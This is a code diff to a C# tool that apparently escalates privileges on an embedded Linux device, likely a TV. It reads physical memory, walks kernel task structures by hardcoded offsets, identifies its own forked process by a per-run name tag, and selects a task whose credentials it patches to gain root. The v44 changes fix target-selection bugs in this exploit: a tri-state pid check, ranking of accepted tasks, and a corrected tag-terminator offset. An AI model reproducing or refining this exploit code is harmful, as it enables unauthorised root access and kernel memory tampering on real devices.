@@ -715,19 +715,40 @@ internal static class Program
         }
     }
 
-    // task->pid, or -1 when the task page does not read back coherently.  pid
-    // and tgid must agree: fork() makes the child its own group leader, while a
-    // pthread would inherit the creator's tgid (never a landmark here).
-    static int TaskPid(uint task)
+    // v44: the pid check is TRI-STATE.  "the page did not read" and "it read a
+    // pid that is not this run's" are different evidence and lead to opposite
+    // actions, so v43's single -1 for both was the bug: a freed landmark whose
+    // pid/tgid words read 0 (the stale shape - its cred lines have been seen
+    // reading 00000000 while its comm stayed coherent) fell through to the
+    // legacy `pu == 5001` latch, and the parent chain of a leftover landmark
+    // points at the same app's old task.
+    //   Unreadable - the read threw.  The ONLY true read failure, and the only
+    //                case that still falls back to the legacy parent-uid rule
+    //                (the rule that roots cold-boot attempt 1).
+    //   Ours       - pid == tgid == the pid fork() returned.
+    //   NotOurs    - pid == tgid, but zero / different / the high half: a
+    //                leftover landmark.  Refused and counted (stale=), never
+    //                patched.  Deliberate trade: a fresh child whose comm has
+    //                not landed and whose pid words read stale-mismatched is
+    //                now refused too - that state is indistinguishable from a
+    //                stale task by any local evidence, and attempt 2 is the
+    //                floor.
+    enum PidRead { Unreadable, Ours, NotOurs }
+
+    // pid and tgid must agree: fork() makes the child its own group leader,
+    // while a pthread would inherit the creator's tgid (never a landmark here).
+    static PidRead TaskPid(uint task, int want)
     {
+        uint w, g;
         try
         {
-            uint w = U32(ReadPhys(V2P(task) + O_PID, 4), 0);
-            uint g = U32(ReadPhys(V2P(task) + O_TGID, 4), 0);
-            if (w != g || w == 0 || w > 0x7FFFFFFF) return -1;
-            return (int)w;
+            w = U32(ReadPhys(V2P(task) + O_PID, 4), 0);
+            g = U32(ReadPhys(V2P(task) + O_TGID, 4), 0);
         }
-        catch { return -1; }
+        catch { return PidRead.Unreadable; }
+        // A zero word is a successful READ of a dead task, not a failed one.
+        if (w == 0 || w != g || w > 0x7FFFFFFF) return PidRead.NotOurs;
+        return (int)w == want ? PidRead.Ours : PidRead.NotOurs;
     }
 
     // A normal process has cred == real_cred (one pointer).  A differing pair is
@@ -872,18 +893,19 @@ internal static class Program
     // offset 0x300), so the first cut that probed page+0x400/page+0x3F8 could
     // never hit a real task and would always have reported "miss".  The probe
     // now works on task ADDRESSES:
-    //   linear      - CommAt(parent) reads "PHYSRPT1\0" at the translated
+    //   linear      - CommAt(parent) reads our per-run tag at the translated
     //                 parent address itself: the read path got the right frame
     //                 and still returned junk cred words;
     //   elsewhere   - sweep proven RAM (0x20000000..0x40000000, the band
     //                 LocateInit/CredScanNear/the tail walks already cover) for
-    //                 the 8 name bytes at ANY offset (slab objects are not
-    //                 page-aligned), verify the NUL follow-byte at hit+8 across
-    //                 the page edge, take the task as hit-0x400, and accept it
-    //                 only when its children list (task+0x2F8, next OR prev)
-    //                 contains &child->sibling = child+0x300 - fork() links
-    //                 the sibling member, not tasks (0x23C), and the pontusml
-    //                 DWARF confirms children=0x2F8/sibling=0x300 beside the
+    //                 the per-run tag at ANY offset (slab objects are not
+    //                 page-aligned), verify the NUL follow-byte one past the tag
+    //                 (hit+len, across the page edge), take the task as
+    //                 hit-0x400, and accept it only when its children list
+    //                 (task+0x2F8, next OR prev) contains &child->sibling =
+    //                 child+0x300 - fork() links the sibling member, not tasks
+    //                 (0x23C), and the pontusml DWARF confirms
+    //                 children=0x2F8/sibling=0x300 beside the
     //                 TV-measured 0x2F0/0x2F4/0x3F8/0x400.  at= is the TASK
     //                 address; cuid=5001 there would make a locate-and-patch
     //                 read path possible without touching the gate;
@@ -905,10 +927,14 @@ internal static class Program
         const int SpanPages = 4096;    // +/- 16 MiB requested around the anchor page
         var sw = System.Diagnostics.Stopwatch.StartNew();
         byte[] selfTag = _selfTagBytes;    // Main()'s per-run PR_SET_NAME
-        // Search the 8 name bytes per page and verify the NUL follow-byte at
-        // hit+8 (one cross-page byte read, only on candidate hits).  A carry
-        // across pages would be order-dependent: the outward +/-step walk does
-        // NOT visit physically adjacent pages consecutively.
+        // Search the per-run tag ("PHYSRPT"+hex(pid), 8..15 bytes) per page and
+        // verify the NUL follow-byte ONE PAST THE TAG, at hit+commPat.Length
+        // (one cross-page byte read, only on candidate hits).  v44: the v38.1
+        // check was hardcoded to hit+8, correct only for the old constant
+        // "PHYSRPT1"; every real tag (pid >= 16 -> 2+ hex digits) has a hex digit
+        // at byte 8, so `hits` stayed 0 and the sweep could only ever say miss.
+        // A carry across pages would be order-dependent: the outward +/-step
+        // walk does NOT visit physically adjacent pages consecutively.
         var commPat = selfTag;
         bool parentHigh = Kptr(parent) && parent >= 0xE0000000;
 
@@ -938,11 +964,11 @@ internal static class Program
         }
         else if (parentHigh)
         {
-            // 2. walk outward from the child's page; find "PHYSRPT1" at any
+            // 2. walk outward from the child's page; find the per-run tag at any
             // offset (tasks are slab objects, not page-aligned; the NUL
-            // follow-byte at +8 is verified across the page edge), take the
-            // task as hit-0x400, and require the children list to link the
-            // child's sibling member - a freed or unrelated look-alike fails
+            // follow-byte one past the tag is verified across the page edge),
+            // take the task as hit-0x400, and require the children list to link
+            // the child's sibling member - a freed or unrelated look-alike fails
             // this check.
             uint cPage = V2P(child) & 0xFFFFF000;
             uint want = child + O_SIBLING;
@@ -967,9 +993,10 @@ internal static class Program
                         {
                             try
                             {
-                                // comm is NUL-terminated at hit+8, which can
-                                // live in the next page; ReadPhys reaches it
-                                if (ReadPhys((uint)hitPa + 8, 1)[0] == 0)
+                                // comm is NUL-terminated one past the per-run
+                                // tag, which can live in the next page; ReadPhys
+                                // reaches it (v44: was a hardcoded +8)
+                                if (ReadPhys((uint)hitPa + (uint)commPat.Length, 1)[0] == 0)
                                 {
                                     hits++;
                                     byte[] nb = ReadPhys((uint)taskPa + O_CHILDREN, 8);
@@ -1806,12 +1833,23 @@ internal static class Program
                 var deadline = DateTime.UtcNow.AddSeconds(fastMode ? 3 : 20);
                 // v43: which latch accepted the child, for the beacon.
                 string tagHow = "none";
+                // v44: per-poll, like seenFork/skipOrphan - the beacon reports
+                // what the walk that produced the line saw, not a running total
+                // that double-counts the same leftover on every poll.
                 int staleTags = 0;
+                // v44: accept rank (exact tag 3 > pid/tgid 2 > legacy prefix 1).
+                // The walk is prev-chain order, unrelated to freshness, so only a
+                // STRICTLY better rank may overwrite: v43 assigned `ours`/`self`
+                // unconditionally, so a weaker accept visited later replaced an
+                // exact one and the patch then used that task's cred.
+                int oursRank = 0, selfRank = 0;
+                int selfPid = Environment.ProcessId;
                 while (DateTime.UtcNow < deadline)
                 {
                     DropPages();
                     child = 0; self = 0;
-                    seenFork = 0; skipOrphan = 0;
+                    seenFork = 0; skipOrphan = 0; staleTags = 0;
+                    oursRank = 0; selfRank = 0;
                     uint ours = 0, maybe = 0, oursPu = 0xFFFFFFFF, maybePu = 0xFFFFFFFF;
                     lastPu = 0xFFFFFFFF;
                     foreach (uint o in offs)
@@ -1834,24 +1872,24 @@ internal static class Program
                                 // check.  A leftover landmark from an earlier AUL
                                 // launch carries neither, so it is REFUSED here
                                 // instead of being patched (the stale-task family).
-                                if (nm == expectChild)
-                                {
-                                    ours = task; oursPu = pu; tagHow = "exact";
-                                }
+                                // v44: the pid read is tri-state, so only a TRUE
+                                // read failure keeps the legacy parent-uid latch; a
+                                // readable pid of zero (a freed task) or a different
+                                // value is refused.  Ranked: never overwrite a
+                                // better accept visited earlier in the chain.
+                                int rank = 0;
+                                if (nm == expectChild) rank = 3;
                                 else
                                 {
-                                    int tpid = TaskPid(task);
-                                    if (tpid >= 0 && tpid == pid)
-                                    {
-                                        ours = task; oursPu = pu; tagHow = "pid";
-                                    }
-                                    else if (tpid >= 0)
+                                    PidRead pr = TaskPid(task, pid);
+                                    if (pr == PidRead.Ours) rank = 2;
+                                    else if (pr == PidRead.NotOurs)
                                     {
                                         staleTags++;      // readable, not this run's
                                     }
                                     else if (pu == 5001)
                                     {
-                                        ours = task; oursPu = pu; tagHow = "prefix";
+                                        rank = 1;         // the only true read failure
                                     }
                                     else
                                     {
@@ -1862,9 +1900,26 @@ internal static class Program
                                         maybePu = pu;
                                     }
                                 }
+                                if (rank > oursRank)
+                                {
+                                    ours = task; oursPu = pu; oursRank = rank;
+                                    tagHow = rank == 3 ? "exact" : (rank == 2 ? "pid" : "prefix");
+                                }
                             }
-                            if (nm == _selfTag) self = task;
-                            else if (nm.StartsWith("PHYSRPT")) self = task;   // legacy tag
+                            // v44: the self accept is ranked too (exact per-run
+                            // tag > our own pid/tgid > legacy PHYSRPT prefix), so
+                            // a stale PHYSRPT task later in the chain cannot
+                            // replace OUR task and get its cred patched.
+                            if (nm == _selfTag)
+                            {
+                                if (selfRank < 3) { self = task; selfRank = 3; }
+                            }
+                            else if (nm.StartsWith("PHYSRPT"))
+                            {
+                                if (selfRank < 2 && TaskPid(task, selfPid) == PidRead.Ours)
+                                { self = task; selfRank = 2; }
+                                else if (selfRank < 1) { self = task; selfRank = 1; }
+                            }
                             if (round == 0 && names.Length < 120) names.Append(nm).Append(',');
                             try { cur = U32(ReadPhys(V2P(cur) + 4, 4), 0); } catch { break; }
                         }
